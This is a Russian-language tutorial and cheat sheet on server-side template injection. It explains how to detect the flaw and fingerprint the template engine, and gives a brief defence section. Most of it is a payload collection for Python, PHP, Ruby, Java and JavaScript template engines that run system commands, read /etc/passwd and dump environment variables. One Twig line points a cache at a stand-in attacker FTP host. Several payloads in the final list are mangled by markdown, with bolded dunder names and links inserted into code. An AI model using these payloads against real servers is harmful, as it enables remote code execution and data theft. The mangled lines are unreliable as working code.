
## Что такое SSTI

Server-Side Template Injection — это уязвимость, которая возникает когда разработчик склеивает пользовательский ввод напрямую с шаблоном, вместо того чтобы передавать его как данные. В результате атакующий может внедрить свой код на языке шаблонизатора, который выполнится на сервере

Безопасный способ (передача данных):

python
`render("Dear {first_name}", data={"first_name": user.first_name})`

Опасный способ (конкатенация строк):

python
`render("Dear " + user_input)`

В последнем случае атакующий может отправить что-то вроде `{{7*7}}` и если в ответе увидит 49 — значит шаблонизатор выполнил код и сайт уязвим.

-----

swift  вот тоже опасно
```swift
let template = "Hello " + userInput
return try await req.view.render(template)


---------
вот так безопасно

let template = "Hello #(name)"
return try await req.view.render(template, ["name": userInput])   

```

-------
## Как обнаружить SSTI

Есть два контекста, в которых может проявиться уязвимость.

### 1. Plaintext контекст

Пользовательский ввод вставляется в обычный текст, например в приветствие: Hello [username]. Чтобы проверить, выполняется ли код, нужно вставить математическое выражение в синтаксисе разных шаблонизаторов и посмотреть на результат

Проверочные пэйлоады для разных движков:

```c

${7*7}
{{7*7}}
{{7*'7'}}
<%= 7*7 %>
{{7*7}}
*{7*7}
#{7*7}
${{7*7}}
```
Если в ответе вместо Hello 7*7 вы увидите Hello 49 =>>>>> это SSTI !!!

### 2. Code контекст

Пользовательский ввод вставляется внутрь уже существующего выражения.
Например есть шаблон `{{ greeting }}`, а параметр greeting формируется из ввода
Тогда нужно сначала закрыть существующее выражение, а потом вставить свое

Проверочный пэйлоад:
```c
data.username}}<tag>

Если в ответе появится `<tag>` после значения переменной — значит удалось вырваться из выражения и SSTI есть
```

-------
## Как определить движок

Проще всего отправить заведомо невалидный синтаксис и посмотреть на ошибку. Например `<%=foobar%>` в ERB вернет ошибку с указанием Ruby. Если ошибки нет, нужно отправлять математические выражения и смотреть что работает

mетод для быстрого определения:

```q
1. Отправить {{7*'7'}}
    
2. Если получили 49 — это Twig
    
3. Если получили 7777777 — это Jinja2
    
4. Если получили 49 в одном месте и 7777777 в другом — значит движков несколько или есть нюансы
    
```

---------
## Как эксплуатировать

Самый мощный вектор — выполнение кода на сервере (RCE). Для этого нужно найти способ вызвать системные команды через объекты, доступные в шаблоне.

### Mako (Python)

Простое выполнение команды через вставку кода:
```html
<%
import os
x=os.popen('id').read()
%>
${x}
```
### ERB (Ruby)

Чтение директорий и файлов через встроенные классы:
```html
<%= Dir.entries('/') %>
<%= File.open('/etc/passwd').read %>
```

### Velocity (Java)

Цепочка вызовов через объект $class:
```q
html
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
```
### Twig (PHP)

Выполнение кода через _self и фильтры:
```q
html
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

----------------------------
## че делать если нет RCE

Даже если код выполнить не удалось, SSTI часто дает доступ к чтению файлов, переменных окружения и конфиденциальных данных

Поиск доступных объектов:
```q
{{_self}}
{{_self.env}}
{{_self.env.getAll()}}
{{app.request.server.all}}
{{config}}
{{settings}}
```

В Java-движках можно попробовать вытащить переменные окружения:
```q

html
${T(java.lang.System).getenv()}
```

Если есть доступ к объектам приложения, нужно искать нестандартные методы, которые добавил разработчик — они часто не задокументированы, но именно в них часто скрываются уязвимости

---------------------------------
## КАК защититься

Главное правило — никогда не собирать шаблон из строк, всегда передавать данные отдельно. Если пользователь может редактировать шаблоны — это уже потенциальная катастрофа. В идеале использовать логически-бедные шаблонизаторы типа Mustache, где нет возможности выполнять код. Если нужно что-то мощнее — запускать шаблонизатор в изолированном контейнере (Docker) и вырезать все опасные функции через настройки песочницы

-----------

## шпаргалка по пэйлоадам (для разных движков)

### Python (Jinja2, Mako, Tornado)
```c
{{config}}
{{6*6}}
{{self.__init__.__globals__.__builtins__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
### Ruby (ERB)
```c
<%= system('id') %>
<%= File.read('/etc/passwd') %>
<%= `id` %>
```

### Java (Freemarker, Velocity)
```c
${7*7}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
${.vars["java.lang.Runtime"].getRuntime().exec("id")}
```

### PHP (Twig, Smarty)
```c
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{$smarty.version}
{php}echo system('id');{/php}
```

### node.js
```c
{{this}}
```

----------




```c
## Python (Jinja2)

{{7*7}}  
{{7*'7'}}  
{{config}}  
{{self}}  
{{this}}
{{self.**class**.**mro**}}  
{{self.**class**.**mro**[1].**subclasses**()}}  
{{self.**init**.**globals**.**builtins**}}  
{{''.**class**.**mro**[1].**subclasses**()}}  
{{''.**class**.**mro**[1].**subclasses**()[132]}} для поиска os._wrap_close  
{{''.**class**.**mro**[1].**subclasses**()[132].**init**.**globals**['popen'](https://'id'/).read()}}  
{{request.application.**globals**.**builtins**.**import**('os').popen('id').read()}}  
{{request.**init**.**globals**['**builtins**'].**import**('os').popen('id').read()}}  
{{().**class**.**bases**[0].**subclasses**()[132].**init**.**globals**['popen'](https://'id'/).read()}}  
{% for x in ().**class**.**bases**[0].**subclasses**() %}{% if 'warning' in x.**name** %}{{x()._module.**builtins**['**import**'](https://'os'/).popen('id').read()}}{%endif%}{%endfor%}

## Python (Mako)

<% import os %>  
<% x=os.popen('id').read() %>  
${x}  
<% print(os.popen('id').read()) %>  
${**import**('os').popen('id').read()}  
${**builtins**.**import**('os').popen('id').read()}

## PHP (Twig)

{{7*7}}  
{{7*'7'}}  
{{_self}}  
{{_self.env}}  
{{_self.env.registerUndefinedFilterCallback("exec")}}  
{{_self.env.getFilter("id")}}  
{{_self.env.registerUndefinedFilterCallback("system")}}  
{{_self.env.getFilter("id")}}  
{{_self.env.setCache("ftp://[attacker.com](https://attacker.com/)")}}  
{{["id"]|map("system")}}  
{{["id"]|filter("system")}}  
{{app.request.server.get('HTTP_USER_AGENT')}}  
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

## PHP (Smarty)

{$smarty.version}  
{php}echo system('id');{/php}  
{php}echo file_get_contents('/etc/passwd');{/php}  
{literal}{/literal}{php}echo system('id');{/php}  
{$smarty.template_object->smarty->enableSecurity()->display('string:{php}echo system("id");{/php}')}  
{if phpinfo()}{/if}  
{if system('id')}{/if}

## Ruby (ERB)

<%= 7*7 %>  
<%= system('id') %>  
<%= File.read('/etc/passwd') %>  
<%= `id` %>  
<%= %x(id) %>  
<%= open('|id').read %>  
<%= IO.popen('id').read %>  
<%= Dir.entries('/') %>  
<%= File.open('/etc/passwd').read %>

## Java (Freemarker)

${7*7}  
${7*'7'}  
${.vars}  
${.data_model}  
${.version}  
${.main}  
${.current_template_name}  
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}  
${"freemarker.template.utility.Execute"?new()("id")}  
${.vars["freemarker.template.utility.Execute"]?new()("id")}  
${.vars["java.lang.Runtime"].getRuntime().exec("id")}  
${.vars["java.lang.System"].getenv()}  
${.vars["java.lang.System"].getProperty("[os.name](https://os.name/)")}

## Java (Velocity)

#set($x=7*7)  
$x  
#set($exec = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))  
$exec  
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")  
$class.inspect("java.lang.ProcessBuilder").type.start()  
#set($str=$class.inspect("java.lang.String").type)  
#set($pb=$class.inspect("java.lang.ProcessBuilder").type.getConstructor($str.TYPE).newInstance(["id"]))  
$pb.start()

## Java (Thymeleaf)

${7*7}  
${T(java.lang.Runtime).getRuntime().exec('id')}  
${T(java.lang.System).getenv()}  
${T(java.lang.System).getProperty('user.dir')}  
${#ctx}  
${#vars}  
${#locale}  
${#request}  
${#response}

## JavaScript (Pug)

#{7*7}  
#{console.log(7*7)}  
#{process.mainModule.require('child_process').execSync('id')}  
#{global.process.mainModule.require('child_process').execSync('id')}  
#{this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}

## JavaScript (EJS)

<%= 7*7 %>  
<%= process.mainModule.require('child_process').execSync('id') %>  
<%= global.process.mainModule.require('child_process').execSync('id') %>  
<%- process.mainModule.require('child_process').execSync('id') %>

## JavaScript (Handlebars)

{{7*7}}  
{{#with (lookup . "constructor")}}  
{{#with (lookup . "constructor")}}  
{{#with (lookup . "eval")}}  
{{#with (lookup . "process")}}  
{{#with (lookup . "mainModule")}}  
{{#with (lookup . "require")}}  
{{#with (lookup . "child_process")}}  
{{#with (lookup . "execSync")}}  
{{#with (lookup . "id")}}  
{{.}}  
{{/with}}  
{{/with}}  
{{/with}}  
{{/with}}  
{{/with}}  
{{/with}}  
{{/with}}  
{{/with}}  
{{/with}}

## Универсальные тестовые пэйлоады для определения движка

${7*7}  
{{7*7}}  
{{7*'7'}}  
<%= 7*7 %>  
_{7_7}  
#{7*7}  
${{7*7}}  
{{7*7}}<tag>  
<%= 7*7 %><tag>  
${7*7}<tag>  
_{7_7}<tag>  
#{7*7}<tag>  
${{7*7}}<tag>  
<%=foobar%>  
{{foobar}}  
${foobar}  
*{foobar}  
#{foobar}  
${{foobar}}
```